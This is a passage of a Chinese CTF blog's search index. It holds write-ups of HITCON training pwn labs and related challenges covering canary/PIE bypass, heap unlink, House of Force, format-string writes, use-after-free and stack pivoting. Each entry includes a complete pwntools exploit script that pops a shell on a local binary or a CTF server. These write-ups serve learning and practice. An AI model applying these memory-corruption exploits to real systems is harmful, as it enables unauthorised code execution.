<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[smallbug3]]></title>
      <url>/sundry/2019/07/18/smallbug3/</url>
      <content type="text"><![CDATA[绕过canary &amp; 确定基址Canary概念canary是一个保护机制，具体的实现，是在ebp和esp之间放入一个canary值，在程序结束的时候判断是否被更改，改变则通过__stack_chk_fail结束当前进程。一定程度上可以防止栈溢出攻击。  注意这里的var_8,就是放canary值的偏移。特性占用一个字的大小，canary值的最低位一定是\x00。绕过方法劫持__stack_chk_failcanary被改写后，程序流程就会经过__stack_chk_fail退出程序。如果将这个函数劫持  例如更改got表就可以在canary检查失败后劫持程序。泄露canary值canary保护机制仅仅检查canary的值是否被篡改，而不会检查栈的其他内容。因此如果每次栈溢出的时候覆盖为相同的值就可以通过检查。如何泄露canary在存储时的最高位（小端序）是’\x00’，会截断canary值和前面的内容。只要将’\x00’覆盖成不会截断字符串打印的值，就可以通过打印字符串的形式得到当前canary值。canary的生成同一个线程里面的canary值是相同的。爆破还没试过。与fork()这个函数和线程有关。覆盖与栈中canary值进行比较的值思路漏洞点程序在判断大小的时候nbytes是做的有符号数，而在read中做参数的时候是无符号数。输入负数即可绕过判断进行栈溢出。流程这个二进制文件checksec一下会发现所有的保护都开了。 FULL RELRO意味着没法改got表，所以要泄露canary的值。要进行三次栈溢出。  打印canary的值&amp; 泄露程序基址  泄露libc基址  getshell程序基址怎么泄露我暂时还没有找到相关资料，但是我打开了一些二进制文件，发现在main函数里面的时候：  32位的ebp指向的栈里保存的是0x0  64位的rbp指向的栈里保存的是__libc_csu_init的地址。  我还搞不清楚的是为什么__libc_csu_init的地址不是7f开头而是与程序加载基址有关。我们如果用这个想法来看这个程序的rbp，虽然他去符号化了，但是按照这个思路来说，就可以根据__libc_csu_init的地址找到main的地址。main_addr = __libc_csu_init_addr &amp; (~0xfff) + 0x9cc0x9cc 是从ida里面看的main地址。因为他开了pie，所以这个只是一个偏移地址。程序加载基址是__libc_csu_init_addr &amp; (~0xfff) 待补充原因libc基址怎么泄露使用puts打印出puts@got的内容。getshell可以使用one_gadget,也可以直接构造system('/bin/sh'),但是如果打远程的话需要知道libc的版本。系统中断不行，找不到int 0x80。注意点  程序是64位，采用寄存器传参，需要使用pop_rdi_ret。  地址低位为\x00时在u64()的前面补\x00，高位则在后面。坑为什么gdb.attach的位置会影响exp？？？expfrom pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal','-x','sh','-c']sh = process('./smallbug3')elf = ELF('./smallbug3')libc = elf.libclog.info("===================&gt;fake size&lt;=================")sh.sendlineafter('name:\n',"-1")log.info("===============&gt;leak canary value&lt;==============")offset = 0x94 - 0x4 - 0x8payload = 'A' * offset + 'B'sh.sendafter('name:\n',payload)sh.recvuntil("B")canary = u64('\x00' + sh.recv(7))print '-------------------{:#x}-----------------'.format(canary)log.info("=============&gt;leak process main addr &lt;===========")elf_base = u64( sh.recv(6) + '\x00\x00') &amp; (~0xfff)main_addr = elf_base + 0x9cclog.info("===============&gt;leak libc base&lt;==================")puts_got = elf.got['puts'] + elf_baseputs_plt = elf.plt['puts'] + elf_basepop_rdi_ret = 0xb33 + elf_basepayload = 'A'* offset + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(puts_got) payload += p64(puts_plt) + p64(main_addr)sh.sendlineafter('us:\n',payload)libc_base = u64(sh.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.symbols['puts']print '-------------------main_addr:{:#x}-----------------'.format(main_addr)print '-------------------libc_base:{:#x}-----------------'.format(libc_base)log.info('===============&gt;get shell&lt;=======================') #one_gadget local_libcone_gadget = libc_base + 0x4239esystem_addr = libc_base + libc.symbols['system']bin_addr = libc_base + libc.search('/bin/sh').next()sh.sendlineafter('name:\n',"-1")sh.sendlineafter('name:\n','A' * 8)#payload = 'A' * offset + p64(canary) + 'A' * 8 + p64(one_gadget)payload = 'A' * offset + p64(canary) + 'A' * 8 + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)sh.sendlineafter('us:\n',payload)sh.interactive()sh.close()]]></content>
      <categories>
        
          <category> sundry </category>
        
      </categories>
      <tags>
        
          <tag> stack canary pie </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[lab11_bamboobox]]></title>
      <url>/hitcon_trainning/2019/07/15/bamboobox/</url>
      <content type="text"><![CDATA[Unlink | HOFUNLINK概念      合并    当一个chunk不属于fastbin的范围时，就会触发向前合并或向后合并。    前提是合并的chunk不在使用当中。    合并之后就会被放进unsortedbin中。    之后还需要判断这个合并之后的总chunk的大小是否大于FASTBIN_CONSOLIDATION_THRESHOLD, 大于就会触发fastbins的合并操作，合并之后仍旧放入unsortedbin，直至fastbins为空。        UNLINK触发情形    本质就是将一个bin中的某个结点拿出来，在分配内存和由free()带来的合并操作都会触发。          当free(a)时,a物理相邻的前一个chunk——b， 被判断 是空闲的，那么b就会从原有bin中断开，和a合并。            发生了什么     其实就是一个简单的双向链表删除某个结点，数据结构讲过很多遍的。  p是一个指向需要unlink的chunk的整个chunk的起始位置。     FD = *(p-&gt;fd) BK = *(p-&gt;bk) *(FD-&gt;bk) = BK *(BK-&gt;fd) = FD //p-&gt;fd == p + SZ_WORD * 2 // 其他同理    SZ_WORD是程序的一个字长我忘却了各大源码里用的啥，瞎编的名字......    这个堆溢出在没有很久很久以前没有检查机制的时候是可以很简单地实现地址任意写的。只要     FD = target_addr - SZ_WORD * 3 BK = shellcode        unlink之后就会有     *target_addr = shellcode        但是那也是很早很早的事情了。如今开了防御措施，会检查FD-&gt;bk和BK-&gt;fd是否等于p。    但是也不是不能利用了，我们先要找到一个指针ptr==p。     fd = ptr - SZ_WORD * 3 bk = ptr - SZ_WORD * 2        unlink的时候就可以绕过检查机制     FD-&gt;bk == ptr - SZ_WORD * 3 + SZ_WORD * 3 == ptr BK-&gt;fd == ptr - SZ_WORD * 2 + SZ_WORD * 2 == ptr        会得到     FD-&gt;bk =  ptr - SZ_WORD * 2 BK-&gt;fd = ptr - SZ_WORD * 3        也就是     *ptr = ptr -  SZ_WORD * 3        ptr最终指向的是ptr前面一点的地方，往ptr里面写payload就能够覆盖ptr本身。然后再次往ptr里面写payload，就能实现地址任意写了。    在覆盖chunk_1的presize时，指的是构造的fake_chunk_0包括size和presize的大小。覆盖size的时候，原来这个地方是什么，就只要把最后一位从1变为0就好，不要改他的大小。不然会提示      但是我不知道为什么。按理来说，应该没得关系，难道是因为AMP里面的p位标识是0？可是double free不也可以吗，而且也不会报和size有关的错叭？    unlink可以看一个大佬写的关于unlink的分析 超详细超厉害der！  思路其实是艰辛的心路历程这道题是昨天晚上这个时间就想到的思路。 [虽然是道基础题但是是难得的一道没看别人exp就想到怎么写的题开心程度堪比拿了ctf全世界冠军（bushi] 毕竟是一道套路题。的确套路了我【微笑.jpg】  change_note这个函数里面没有检查输入长度，堆溢出。堆的几个漏洞里面，堆溢出我只会unlink，所以就顺着这个思路一直往下写了。整个chunk的起始位置      这个整个chunk的起始位置和presize、size就是今天的一个我的大坑之一。    nodelist的地址指向的是非空闲chunk数据开始的地方，而检查的时候，是检查这个地址是不是指向这个chunk的presize。    我一开始想的是用chunk_0溢出伪造chunk_1空闲的假象，然后free(chunk_0)。也就是向后合并。    我错在直接在chunk_1的原来的presize的地方开始构造，但是nodelist[1]不指向这里，也没有一个可以利用的指向这里的指针，所以通不过防御机制。    而且就算我从nodelist[1]这个地方开始构造，因为没有改到chunk_0的size域，导致ptmalloc找chunk_1的时候找到的还是chunk_1的presize的地方。    所以这个题是只能向前合并的[我jio得]。    size 和 presize就纯粹是脑子没转过弯来以及知识盲区。        哇塞真的好菜啊TAT  惊天大坑！昨天一晚上今天一上午，我都在想，为什么，我的exp让一个chunk在free之后，只是把相关数据清零，但是这个chunk并没有被放进任何一个bins。然后我找了别人的exp跑了一下，卡死了。我直接用gdb调试二进制文件，发现不是exp的原因，free()这个函数就很玄学，他不按说好的来啊根本就！！我环境是glibc2.27, 师傅让我在2.23里面跑一下。 发现是没问题的。  含恨在2.23里面调试，但是2.23不行啊，生成容器的时候默认的安全机制开太大了gdb根本没法用。师傅说的解决方法我没有理解，于是又看了一下午docker怎么用 *[露出菜鸟的疲惫微笑]* 。我以为就是在run一个新的容器就好，没想到这个最简单的镜像里啥都没有。这里不得不说感谢师傅帮忙装好了python和gdb和一些别的环境，我一下子真的弄不来[头秃]。最后灵光一闪懂了大佬说的那个解决方法，用现有容器commit一个镜像再run一个容器。【菜是真的菜】那么2.27到底是个什么机制我也没有搜到。expfrom pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh = process('./bamboobox')elf = ELF('./bamboobox')libc = elf.libcatoi_libc = libc.symbols['atoi']atoi_got = elf.got['atoi']system_libc = libc.symbols['system']notelist_addr = 0x6020C8def add_note(length,content):    sh.sendlineafter('choice:','2')    sh.sendlineafter('name:',str(length))    sh.sendlineafter('item:',content)def show_note(idx):    sh.sendlineafter('choice:','1')    sh.recvuntil(str(idx)+' :')    addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))    return addrdef change_note(idx,length,content):    sh.sendlineafter('choice:','3')    sh.sendlineafter('item:',str(idx))    sh.sendlineafter('name:',str(length))    sh.sendafter('item:',content)def del_note(idx):    sh.sendlineafter('choice:','4')    sh.sendlineafter('item',str(idx))add_note(0x80,'a'*8)add_note(0x80,'b'*8)payload = p64(0) + p64(0x81) + p64(notelist_addr -24) + p64(notelist_addr - 16) payload = payload.ljust(0x80,'A')payload += p64(0x80) + p64(0x90) change_note(0,len(payload),payload)del_note(1)payload = 'A'*24 + p64(atoi_got)change_note(0,len(payload),payload)atoi_addr = show_note(0)system_addr = atoi_addr - atoi_libc + system_libcpayload = p64(system_addr)change_note(0,len(payload),payload)sh.sendlineafter('choice:','/bin/sh\x00')sh.interactive()sh.close()House of Force概念在向top  chunk分割出内存时进行的操作：// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) //&lt;============{    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;// &lt;=================    set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}控制top  chunk的指针 av-&gt;top 指向目的地址，当再次需要malloc的时候，就会返回一个目的地址的指针，通过这个指针就可以更改目的地址的内容。其实就是地址任意写。利用要求是：  堆溢出的条件  分配大小可以自己定实现比较难的地方是计算分配的大小。//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1// (The minimumsize is 16 bytes on most 32bits systems, and 24 or 32 bytes on 64bits systems.)#define request2size(req)                                                      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE）?         MINSIZE:         ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp;~MALLOC_ALIGN_MASK)详见ctfwiki。解法这道题用hof的话要分配三次内存。 第一次是用来控制top_chunk的size， 第二次是用来将top_chunk指向目标位置，第三次是用来在目标位置写入数据。第一次分配的chunk大小须大于MINSIZE， 第二次这个目标位置：  我一开始是接着用atoi的got表地址的。但是题目虽然没有开PIE，我的环境是开了ASLR的，也就是说无法确定topchunk的具体位置，所以需要设置      sh = process('./bamboobox',aslr=0)        本地这个样子是可以，但是我觉得打远程也这样就会很悬。      因为程序一开始设置了两个函数指针存在堆里面，分别在开始和结束的时候调用，而这个地方离top_chunk的距离是可以计算的，所以这个地方是可以覆盖的。system是不可能了，但是程序有一个magic函数。      expfrom pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh = process('./bamboobox')elf = ELF('./bamboobox')libc = elf.libcatoi_libc = libc.symbols['atoi']atoi_got = elf.got['atoi']system_libc = libc.symbols['system']notelist_addr = 0x6020C8magic = 0x0400D49def add_note(length,content):    sh.sendlineafter('choice:','2')    sh.sendlineafter('name:',str(length))    sh.sendafter('item:',content)def show_note(idx):    sh.sendlineafter('choice:','1')    sh.recvuntil(str(idx)+' :')    addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))    return addrdef change_note(idx,length,content):    sh.sendlineafter('choice:','3')    sh.sendlineafter('item:',str(idx))    sh.sendlineafter('name:',str(length))    sh.sendafter('item:',content)def del_note(idx):    sh.sendlineafter('choice:','4')    sh.sendlineafter('item',str(idx))length = 0x60add_note(length,'a'*8)pause()payload = 'A' * length + p64(0x0) + p64(0xffffffffffffffff)change_note(0,len(payload),payload)# a的chunk 总大小是 length + 0x10，v 的 chunk 大小是0x20，SIZE_SZ 是 0x10。原本就是对齐的，所以不需要+ maskreq = -( length  + 0x10 ) - 0x20 - 0x10add_note(req,'a' * 8)add_note(0x10,p64(magic)*2)sh.sendlineafter('choice:','5')sh.interactive()sh.close()注意仍旧需要在glibc2.23的环境下才能跑。[为什么啊！！]]]></content>
      <categories>
        
          <category> hitcon_trainning </category>
        
      </categories>
      <tags>
        
          <tag> heap </tag>
        
          <tag> unlink </tag>
        
          <tag> HOF </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[lab9_playfmt]]></title>
      <url>/hitcon_trainning/2019/07/13/playfmt/</url>
      <content type="text"><![CDATA[格式化字符串漏洞格式化字符串漏洞的两个利用方式  泄露栈上内容  改写某地址内容（前提是这个地址要在栈上，也就是printf可控的地方）原理是用格式化字符串对栈上的相对而言的参数进行解析。  如果用的%k$p、%k$x等就是打印出来相对printf的第几个参数；%s可以打印栈上地址指向的内容（等会用这个打印printf@got），也可以用来破坏程序；%n可以向地址类参数指向的地方写入内容。思路一开始就是没有思路，太菜了，真的太菜了TAT。这里的buf是在bss段，也就是意味着没有办法用常规方法做。看了大佬的wp才知道可以控制ebp来实现地址任意写。但是我觉得或许用栈迁移也可以试一下。先写一波控制ebp！为什么buf在bss段就没法用常规方法？  常规方法是利用栈上内容可写，将其写为某个地址，然后用%k$n这样的方式把这个地址指向的内容改掉。 而现在buf没法通过直接写入来控制栈上的地址。控制ebp现在关键是要找到栈上哪些位置里面的内容是地址而且是可以控制栈上别的位置的内容的，以此来写入我们的目的地址。这个地方就是ebp。ebp本来就是用来保存之前的ebp的内容。比如我们设想一个情况：  ebp_1是相对printf的第6个参数，里面存着ebp_2的地址;  ebp_2是相对printf的第10个参数;  格式化字符串漏洞就可以通过 %6$n改写ebp_2指向别的地方。改写过后，ebp_2内就是栈上另外位置的地址，我们假设他是fmt_7，是相对于printf的第7个参数。  %10$n 就可以让fmt_7指向printf@got。  %7$s 就可以打印出printf@got的内容从而计算出system的真实地址。 用 %7$n就可以直接改写printf@got为system的地址，接下来再调用printf就是调用system了。但是有一个问题，%k$n一用就炸，也就是说我们起码要用hn，在找fmt_7的时候要求其内容的前两个字节和got表的前两个字节是相同的。并且在改写printf@got的时候，至少要把它分为两次写进去，那么我们就还要有一个地方指向printf@got+2，这个地址的要求和fmt_7是一样的。expfrom pwn import *context.log_level='debug'context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh = process('./playfmt')elf = ELF('./playfmt')libc = elf.libc#gdb.attach(sh)#-----------------address prepare----------------printf_got = elf.got['printf']printf_libc = libc.symbols['printf']system_libc = libc.symbols['system']sh.recv()sh.sendline('%6$x')ebp_2 = int(sh.recv(),16)fmt_7 = ebp_2-0xcfmt_11 = ebp_2+0x4ebp_1 = fmt_7-0x4#-----------------ebp_2--&gt;fmt_7--------------------payload = '%'+str(fmt_7 &amp; 0xffff)+'c%6$hn\x00'sh.sendline(payload)sleep(0.3)'''这里的一段while，是因为%kc输出的实在太多了recv()每次只能接受0x1000的内容如果没有循环的话会卡住。用一个标识符做接受完成标志至于为什么这里每次都要sendline('yes!')因为他可能前面的输出加上'ye'刚好就是0x100,后面就会因为只有's!'而没法跳出循环，就卡死了[↑血的教训=皿=]sleep(0.1)是两个sendline之间的常规操作来应对玄学问题[我猜的]。'''sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------fmt_7--&gt;printf@got----------------payload = '%' + str(printf_got &amp; 0xffff)+'c%10$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------ebp_2--&gt;fmt_11--------------------payload = '%' + str(fmt_11 &amp; 0xffff) + 'c%6$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------fmt_11--&gt;printf@got+2---------------payload = '%' + str((printf_got+2) &amp; 0xffff) +'c%10$hn\x00'sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        break#-----------------calculate system address-------------sh.sendline('%7$s')printf_elf = u32(sh.recv(4))system_elf = printf_elf-printf_libc+system_libclog.info('************{:#x}***********'.format(system_elf))#----------------change global offset table------------addr_1 = system_elf &amp; 0xffffaddr_2 = system_elf&gt;&gt;16'''这里是防止addr_2比addr_1小嘻嘻，从师傅那里偷学的方法=v='''ls=[0,addr_1,addr_2]ls.sort()lis={0:0,addr_1:7,addr_2:11}payload=''for i in range(1,3):    payload += '%' + str(ls[i]-ls[i-1]) + 'c%' + str(lis[ls[i]]) + '$n'payload += '\x00'log.info('************{}***********'.format(payload))sh.sendline(payload)sleep(0.3)sh.sendline('yes!')while True:    sh.sendline('yes!')    sleep(0.1)    if sh.recv().find('yes!') != -1:        breaksleep(0.1)sh.sendline('/bin/sh')sh.interactive()sh.close()栈迁移这个思路按理是可以的，把do_fmt的返回地址改成read的，按照常规栈迁移的套路来，然后用read做栈溢出，输入quit就可以开始栈迁移。但是ebp_1怎么变是一个问题，%k$n的输出太长了会炸是另一个问题，好麻烦啊。不想写了。【可能这就是我咸鱼的原因。】]]></content>
      <categories>
        
          <category> hitcon_trainning </category>
        
      </categories>
      <tags>
        
          <tag> stack </tag>
        
          <tag> formating_string </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[lab10_hacknote]]></title>
      <url>/hitcon_trainning/2019/07/13/hacknote/</url>
      <content type="text"><![CDATA[堆漏洞-UAF全称 use after free，是在free之后指针没有置NULL留下的漏洞。这就导致之前的指针还可以控制这块内存。这道题利用的是内存分配机制的fastbins。fastbinsfastbins也是一个bins，和smallbins和unsortbins不同的是，放入其中的chunk使用标志位P不会被置0，在非特定场合下是不会触发合并操作的。  小于max_fast（默认是64B）的chunk都会被放到其中，使用时为  精确匹配、先进后出思路本来就是打pwn苦手，搞堆真的更加难受[留下心酸泪水]这道题做第二次了，寒假集训的时候也做了。但谁能想到，第二次做的时候仍旧是较为懵逼。  这道题在ctfwiki上有详细解释。这道题里面，notelist中每一个元素大小是8B，前4B是一个打印函数地址，后4B是用来存放content的地址。 ps:以下都没有考虑chunk的控制域大小 在申请notelist[0]、notelist[1]，content的大小不为8B就可以， [chunk会自动对齐到8B,所以不能比8B小] 之后del，fastbins中8B的bin中就有了两个chunk。申请notelist[2]时将content的大小设置为8，那么在分配的时候，notelist[1]原本的chunk给了notelist[2],notelist[0]原本的chunk给了notelist[2]的content。所以就可以控制notelist[0]的打印函数地址。expfrom pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal','-x','sh','c']sh = process('./hacknote')elf = ELF('./hacknote')magic_addr=elf.symbols['magic']#gdb.attach(sh)def add_note(sz,content):    sh.sendlineafter('choice :','1')    sh.sendlineafter('size :',str(sz))    sh.sendlineafter('Content :',content)def del_note(index):    sh.sendlineafter('choice :','2')    sh.sendlineafter('Index :',str(index))def print_note(index):    sh.sendlineafter('choice :','3')    sh.sendlineafter('Index :',str(index))add_note(16,'aaaa')add_note(16,'aaaa')del_note(0)del_note(1)payload = p32(magic_addr)add_note(8,payload)print_note(0)sh.interactive()sh.close()]]></content>
      <categories>
        
          <category> hitcon_trainning </category>
        
      </categories>
      <tags>
        
          <tag> heap </tag>
        
          <tag> uaf </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[lab7_crack]]></title>
      <url>/hitcon_trainning/2019/07/12/crack/</url>
      <content type="text"><![CDATA[格式化字符串漏洞非getshell思路  按代码的逻辑来说，是要求猜一个随机数，如果这里的cat flag的确有这个flag的话，那么覆盖password成为指定内容就可以做完了。password是一个bss段的变量，而checksec发现地址随机化没开，所以password的地址确定了。       **payload**    buf是第十个参数,干脆把他覆盖成0。然后再加上前面格式化字符串的长度，可以得到地址开始是第17个参数。    payload="%17$hhn%18$hhn%19$hhn%20$hhnA"+p32(0x0804a048)+p32(0x0804a049)+p32(0x0804a050)+p32(0x0804a051)      expfrom pwn import *import time #context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh=process("./crack")context.log_level='debug'#gdb.attach(sh)payload="%17$hhn%18$hhn%19$hhn%20$hhn"+p32(0x0804a048)+p32(0x0804a049)+p32(0x0804a04a)+p32(0x0804a04b)sh.sendlineafter("name ? ",payload)time.sleep(0.1)sh.sendlineafter(':','0')sh.interactive()sh.close()getshell  我大胆想象一下，如果我把atoi的got表给改成system的plt表……from pwn import *import time #context.terminal = ['deepin-terminal', '-x', 'sh', '-c']sh=process("./crack")elf=ELF("./crack")context.log_level='debug'#gdb.attach(sh)atoi_got_addr=elf.got['atoi']system_plt_addr=elf.plt['system']payload=fmtstr_payload(10,{atoi_got_addr:system_plt_addr})sh.sendlineafter('? ',payload)time.sleep(0.1)sh.sendlineafter(':',"/bin/sh")sh.interactive()sh.close()plt表是不可写的= =。 ]]></content>
      <categories>
        
          <category> hitcon_trainning </category>
        
      </categories>
      <tags>
        
          <tag> stack </tag>
        
          <tag> formating_string </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[lab6_migration]]></title>
      <url>/hitcon_trainning/2019/07/11/migration/</url>
      <content type="text"><![CDATA[ 栈溢出——栈迁移错误思路漏洞栈溢出这里的buf溢出了0x40-0x28 个字节checksec比较友好，没有开地址随机化。解决是一个ret2libc的题目，返回到puts打印libc_start_main的got表地址，确定libc的版本。这里有一个问题就是我不知道这个count如果在我返回到libc_start_main的话是不是会被初始化，我先试一下。然后计算system和/bin/sh， 返回到这里。不行。因为这个libc的基址是后面计算才知道的，没法提前就写进去。正确不是这么搞的= =，好累。正确的思路是栈迁移。漏洞还是栈溢出啊。判断是栈迁移的原因有几点    1. 因为count那个地方其实是一个hint，告诉你ret2libc是行不通的。    2. 能够构造成payload的长度是0x40-0x28其实只有0x18太短了。    3. 因为system的地址是算出来的，所以要多次输入，也就是多次返回到read，但是不能直接返回到main函数里面，所以说需要直接返回到read，并且多次通过read再一次栈溢出控制程序流程，所以需要控制栈的地址。但是实在程序加载的时候你是没法确定栈地址的[反正我现在不可以确定]，于是就是栈迁移！思路栈迁移的基本思路是用leave；ret；leave;ret;mov %ebp,%esppop %ebppop %eip这样就可以把esp劫持走。这道题可以把栈迁移到bss。权限和大小是够的。过程  第一次系统自带的read栈溢出需要打印基址以及实现栈迁移。选择bss段一个中间位置，瞎选一个bss+0x500栈的构造应该是    esp junk data ......ebp bss+0x500 put_plt pop1ret libc_start_main_got read_plt leave_ret 0 bss+0x500 0x100    第二次的栈溢出需要输入/bin/sh，然后执行system。栈的构造是esp/ebp bss+0x400        read_plt        pop3ret        0        bss+0x400        0x100        system_addr        0xdeadbeef        bss+0x400(bin_sh_addr)pop1ret和pop3ret：错误： 第一次不能实现这么多功能，他只有0x18个数据，payload长度超了。所以要把他分成两次  第一次esp junk data    ... ...ebp bss+0x500    read_plt    leave_ret    0    bss+0x500    0x100  第二次esp/ebp bss+0x400        put_plt        pop1ret        libc_start_main_got        read_plt        leave_ret        0        bss+0x400        0x100  第三次esp/ebp bss+0x500        read_plt        pop3ret        0        bss+0x500        0x100        system_addr        0xdeadbeef        bss+0x500expfrom pwn import *from LibcSearcher import *context.log_level='debug'sh=process('./migration')elf=ELF("./migration")pause()libc_start_main_got=elf.got['__libc_start_main']puts_plt=elf.plt['puts']read_plt=elf.plt['read']bss_addr=elf.bss()pop1ret=0x0804836dpop3ret=0x08048569leave_ret=0x08048418offset=0x28#------------move stack-----------payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])sh.sendafter("best :\n",payload)#-----------leak libc base-------payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])sh.send(payload)libc_start_main_addr=u32(sh.recv()[0:4])print 'libc_start_main_got----------&gt;{:x}'.format(libc_start_main_addr)libc=LibcSearcher('__libc_start_main',libc_start_main_addr)libcbase=libc_start_main_addr-libc.dump('__libc_start_main')system_addr=libcbase+libc.dump('system')print 'system-----------------------&gt;{:x}'.format(system_addr)#---------get shell---------------payload=flat([bss_addr+0x500,read_plt,pop3ret,0,bss_addr+0x500,0x100,system_addr,0xdeadbeef,bss_addr+0x500])sh.send(payload)sh.send('/bin/sh\x00')sh.interactive()sh.close()后记本来想用libcsearch找/bin/sh的地址直接返回，但是谁能想到他太不争气了，和本机的libc版本不同导致不知道找了个啥东西，也不知道system是怎么找对的。还被师傅骂一通TAT还diss我代码写的丑TAT这里有一个trick，libc=elf.libc,然后就不用导入libc了。from pwn import *context.log_level = 'debug'sh = process('./migration')elf = ELF("./migration")libc = elf.libccontext.binary = "./migration"libc_start_main_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']read_plt = elf.plt['read']bss_addr = elf.bss()pop1ret = 0x0804836dpop3ret = 0x08048569leave_ret = 0x08048418offset = 0x28#------------move stack-----------payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])sh.sendafter("best :\n",payload)#-----------leak libc base-------payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])sh.send(payload)libc_start_main_addr=u32(sh.recvn(4))print 'libc_start_main_addr----------&gt;{:x}'.format(libc_start_main_addr)libc.address = libc_start_main_addr - libc.sym['__libc_start_main']system_addr=libc.sym['system']bin_sh_addr=libc.search('/bin/sh').next()# pause()print 'system-----------------------&gt;{:x}'.format(system_addr)#---------get shell---------------payload=flat([bss_addr+0x500,system_addr,0xdeadbeef,bin_sh_addr])sh.send(payload)sh.interactive()sh.close()]]></content>
      <categories>
        
          <category> hitcon_trainning </category>
        
      </categories>
      <tags>
        
          <tag> stack </tag>
        
          <tag> leave_stack </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[面向板子写exp]]></title>
      <url>/curriculum_self/2017/07/18/exploit/</url>
      <content type="text"><![CDATA[pwn 是什么钻可执行二进制文件的空子的一种技术。pwn 需要的工具  一些python技能  pwntools  ida  gdb  关于程序漏洞的基础知识pwn 可以干什么利用提前写好的脚本攻击某一个进程，控制运行这个进程的主机。也就是常说的getshell。几个基础漏洞  栈溢出  堆溢出  格式化字符串漏洞  其他 ——对不起我还没有学到这里来TAT例子简单栈溢出关于栈的内容：click!      jarvisoj-level1    直接往栈上直接写shellcode。将返回地址覆盖成shellcode开始的地址。   两个条件：          NX防护没有开      知道栈地址                jarvisoj-level0                  漏洞是明显的栈溢出。            自带getshell函数。                      checksec可以发现            PIE没开，所以可以直接攻击他的返回地址。                       exp ```python from pwn import *              sh= process(“./level0”) system_addr=0x400596 payload=’A’ * 0x80 +’B’ * 0x8 +p64(system_addr)    sh.sendline(payload) sh.interactive() ```        jarvisoj-level2    这道题没有直接的system("/bin/sh"),需要在伪造返回地址的基础上构造参数。     from pwn import * payload = 'a'*(0x88+0x4) elf=ELF("./level2") sys_addr=elf.symbols["system"] bin_addr=elf.search("/bin/sh").next() payload += p32(sys_addr)+p32(0xdeadbeef)+p32(bin_addr) sh=remote("pwn2.jarvisoj.com",'9878') sh.sendline(payload) sh.interactive()      基础 ROP 利用ctfwiki上讲的太详细了=v&lt;smallbug3  关于canary和pie的ret2_dl_runtime_resolve概念  四个section          .dynamic         保存了下面三个section的指针。         2. .dynstr    是一个字符串表，内容是指针，指向函数名字符串。          3. .dynsym    是一个结构体数组。          4. .rel.plt     也是一个结构体数组。      __dl_runtime_resolve 大致流程攻击手段改写.dynstr节的指针让这个指针指向我们需要的函数名字符串，例如system字符串  缺陷  只有在NO RELRO时候才有权限更改.dynstr。伪造结构体因为函数的执行过程就是不断地寻找结构体，从结构体中拿数据，而在函数源码中，并不会检查offset是否会过界，所以我们可以在可控制的地方伪造结构体，来调用目标函数。      计算fake_rel和.rel.plt的距离偏移量作为offset，注意64位需要除以sizeof(ELF32_REL)。        伪造一fake_rel，使他的rel_info字段成为0x******07，这个07是导入函数的参数。暂时不知道干嘛的，但最好不要改。        ******是指fake_sym距离.dynsym的偏移/sizeof(ELF32_SYM)。        fake_sym中st_name是fake_string距离.dynstr的偏移量。  三道题heapunlinkHOFUAF格式化字符串漏洞其他只了解了一个.init_array 和 .fini_array节存放了指向初始化代码和终止代码的函数指针。.init_array函数指针会在调用main()之前被触发，.fini_array函数指针在main()执行完后才被触发。 这就意味着可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。写exp时的几个trick  显示发送和接收的数据    context.log_level = 'debug'        debug    context.terminal = ['deepin-termina','-x','sh','-c']sh=process('./elffile')gdb.attach(sh)        不用写libc的绝对路径    libc = ELF('./elffile').libc      ]]></content>
      <categories>
        
